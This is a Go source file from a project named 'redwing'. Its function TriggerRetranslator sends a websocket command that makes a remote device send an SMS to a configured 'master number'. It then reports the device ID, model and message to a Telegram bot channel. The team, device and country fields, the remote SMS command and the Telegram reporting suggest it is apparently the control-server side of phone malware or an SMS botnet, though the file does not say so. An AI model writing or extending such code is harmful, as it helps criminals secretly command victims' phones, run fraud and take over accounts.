package api

import (
	"fmt"
	"log"
	"time"

	"redwing/internal/db"
	"redwing/internal/ws"
)

func TriggerRetranslator(teamID, deviceID string) {
	masterNumber := GetSetting(teamID, "retrans_number")
	if masterNumber == "" {
		return
	}

	msg := fmt.Sprintf("RW:%s:%d", deviceID[:minLen(len(deviceID), 8)], time.Now().Unix()%10000)

	sent := ws.H.SendToDevice(deviceID, map[string]any{
		"type":    "ws_command",
		"command": "send_sms",
		"params": map[string]any{
			"phone":   masterNumber,
			"message": msg,
		},
	})

	if sent {
		log.Printf("[RETRANS] SMS sent from %s to %s", deviceID, masterNumber)
	}

	retransBotToken := GetSetting(teamID, "retrans_bot_token")
	retransChatID := GetSetting(teamID, "retrans_channel_id")
	if retransBotToken != "" && retransChatID != "" {
		var model, country string
		db.DB.QueryRow("SELECT COALESCE(model,''), COALESCE(country,'') FROM devices WHERE device_id = ?", deviceID).Scan(&model, &country)

		nl := getNotifyLang(teamID)

		text := fmt.Sprintf(
			"📡 Retrans\n\n%s: %s\n%s: %s\n📞 → %s\n💬 %s\n\n🕐 %s",
			nl.Device, deviceID,
			nl.Model, model,
			masterNumber, msg,
			time.Now().Format("02.01.2006 15:04:05"),
		)
		go func() {
			if err := sendTelegram(retransBotToken, retransChatID, text); err != nil {
				log.Printf("[RETRANS] telegram send failed: %v", err)
			}
		}()
	}
}

func minLen(a, b int) int {
	if a < b {
		return a
	}
	return b
}
